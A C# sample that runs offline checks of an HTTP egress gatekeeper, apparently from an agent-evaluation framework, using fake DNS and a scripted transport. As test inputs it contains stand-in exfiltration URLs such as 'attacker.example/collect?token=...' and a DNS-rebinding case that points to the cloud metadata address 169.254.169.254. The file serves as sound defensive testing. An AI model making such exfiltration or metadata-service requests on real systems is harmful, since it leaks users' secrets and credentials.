// SPDX-License-Identifier: MIT
// Copyright (c) 2026 AgentEval Contributors

using System.Net;
using System.Net.Sockets;
using AgentEval.MAF.Gatekeeper.Egress;

namespace AgentEval.Samples;

/// <summary>Deterministic HTTP wire-boundary sample with fake DNS and transport; no socket is opened.</summary>
public static class GatekeeperHttpWireBoundary
{
    public static async Task RunAsync()
    {
        GatekeeperSampleContractRenderer.Print("23");
        Console.WriteLine("\n=== Gatekeeper — HTTP Wire Boundary (offline) ===\n");

        await AllowedHostAsync();
        await RedirectEscapeAsync();
        await DnsRebindAsync();
        await RedirectLimitAsync();
        await CallerCancellationAsync();
        await NonLeakingBlockAsync();

        Console.WriteLine("   ✅ allow-list, every redirect hop, DNS answers, limits, cancellation, and disclosure were verified without network access.");
    }

    private static async Task AllowedHostAsync()
    {
        var transport = new ScriptedTransport().Respond(HttpStatusCode.OK);
        using var client = Client(transport, new FakeDns().With("api.example.com", "8.8.8.8"));
        using var response = await client.GetAsync("https://api.example.com/orders");
        Require(response.StatusCode == HttpStatusCode.OK && transport.Requests.Count == 1,
            "an allow-listed host with public DNS must pass once");
        Console.WriteLine("   public allow-listed host:       ALLOW");
    }

    private static async Task RedirectEscapeAsync()
    {
        var transport = new ScriptedTransport()
            .Respond(HttpStatusCode.Found, "https://attacker.example/collect");
        using var client = Client(transport, new FakeDns().With("api.example.com", "8.8.8.8"));
        var blocked = await CaptureBlockAsync(() => client.GetAsync("https://api.example.com/start"));
        Require(blocked.Host == "attacker.example" && transport.Requests.Count == 1,
            "the allowed first hop must run and the forbidden redirect must be blocked before transport");
        Console.WriteLine("   redirect to forbidden host:     BLOCK at hop 2");
    }

    private static async Task DnsRebindAsync()
    {
        var transport = new ScriptedTransport().Respond(HttpStatusCode.OK);
        using var client = Client(transport, new FakeDns().With("api.example.com", "169.254.169.254"));
        await CaptureBlockAsync(() => client.GetAsync("https://api.example.com/metadata"));
        Require(transport.Requests.Count == 0,
            "an allow-listed name resolving to a reserved address must be blocked before transport");
        Console.WriteLine("   allow-listed name → metadata IP: BLOCK before transport");
    }

    private static async Task RedirectLimitAsync()
    {
        var transport = new ScriptedTransport()
            .Respond(HttpStatusCode.Found, "https://api.example.com/1")
            .Respond(HttpStatusCode.Found, "https://api.example.com/2")
            .Respond(HttpStatusCode.Found, "https://api.example.com/3");
        using var client = Client(
            transport,
            new FakeDns().With("api.example.com", "8.8.8.8"),
            maxRedirects: 1);
        await CaptureBlockAsync(() => client.GetAsync("https://api.example.com/start"));
        Require(transport.Requests.Count == 2,
            "the original request plus one allowed redirect must be the measured limit");
        Console.WriteLine("   redirect chain beyond limit:    BLOCK after measured bound");
    }

    private static async Task CallerCancellationAsync()
    {
        var transport = new ScriptedTransport().Respond(HttpStatusCode.OK);
        using var cancellation = new CancellationTokenSource();
        var dns = new CancelledDns();
        using var client = Client(transport, dns);
        cancellation.Cancel();
        try
        {
            await client.GetAsync("https://api.example.com/orders", cancellation.Token);
            throw new InvalidOperationException("HTTP wire sample failed: caller cancellation was ignored.");
        }
        catch (OperationCanceledException) when (cancellation.IsCancellationRequested)
        {
            // Expected: caller cancellation is preserved, not rewritten as a policy block.
        }

        Require(transport.Requests.Count == 0, "cancelled work must never enter the transport");
        Console.WriteLine("   caller cancellation:            PRESERVED");
    }

    private static async Task NonLeakingBlockAsync()
    {
        const string marker = "private-query-marker";
        var transport = new ScriptedTransport().Respond(HttpStatusCode.OK);
        using var client = Client(transport, new FakeDns());
        var blocked = await CaptureBlockAsync(
            () => client.GetAsync($"https://attacker.example/collect?token={marker}"));
        Require(!blocked.Message.Contains(marker, StringComparison.Ordinal),
            "a host allow-list refusal must not echo query data");
        Require(transport.Requests.Count == 0, "the refused request must not reach transport");
        Console.WriteLine("   refusal disclosure:             host-only, query withheld");
    }

    private static HttpClient Client(
        HttpMessageHandler inner,
        IDnsResolver dns,
        int maxRedirects = 5) =>
        new(
            new GatekeeperHttpMessageHandler(
                inner,
                ["example.com"],
                new GatekeeperHttpEgressOptions
                {
                    DnsResolver = dns,
                    BlockPrivateNetworks = true,
                    MaxRedirects = maxRedirects,
                    DnsResolutionTimeout = TimeSpan.FromMilliseconds(500),
                }));

    private static async Task<HttpEgressBlockedException> CaptureBlockAsync(Func<Task<HttpResponseMessage>> action)
    {
        try
        {
            using var _ = await action();
        }
        catch (HttpEgressBlockedException exception)
        {
            return exception;
        }

        throw new InvalidOperationException("HTTP wire sample failed: expected a fail-closed egress refusal.");
    }

    private static void Require(bool condition, string message)
    {
        if (!condition)
        {
            throw new InvalidOperationException("HTTP wire sample failed: " + message + ".");
        }
    }

    private sealed class ScriptedTransport : HttpMessageHandler
    {
        private readonly Queue<(HttpStatusCode Status, string? Location)> _responses = [];
        public List<HttpRequestMessage> Requests { get; } = [];

        public ScriptedTransport Respond(HttpStatusCode status, string? location = null)
        {
            _responses.Enqueue((status, location));
            return this;
        }

        protected override Task<HttpResponseMessage> SendAsync(
            HttpRequestMessage request,
            CancellationToken cancellationToken)
        {
            cancellationToken.ThrowIfCancellationRequested();
            Requests.Add(request);
            if (!_responses.TryDequeue(out var scripted))
            {
                throw new InvalidOperationException("HTTP wire sample has no scripted transport response.");
            }

            var response = new HttpResponseMessage(scripted.Status);
            if (scripted.Location is not null)
            {
                response.Headers.Location = new Uri(scripted.Location);
            }

            return Task.FromResult(response);
        }
    }

    private sealed class FakeDns : IDnsResolver
    {
        private readonly Dictionary<string, IPAddress[]> _answers = new(StringComparer.OrdinalIgnoreCase);

        public FakeDns With(string host, params string[] addresses)
        {
            _answers[host] = addresses.Select(IPAddress.Parse).ToArray();
            return this;
        }

        public Task<IPAddress[]> ResolveAsync(string host, CancellationToken cancellationToken = default) =>
            _answers.TryGetValue(host, out var addresses)
                ? Task.FromResult(addresses)
                : throw new SocketException((int)SocketError.HostNotFound);
    }

    private sealed class CancelledDns : IDnsResolver
    {
        public Task<IPAddress[]> ResolveAsync(string host, CancellationToken cancellationToken = default) =>
            Task.FromCanceled<IPAddress[]>(cancellationToken);
    }
}
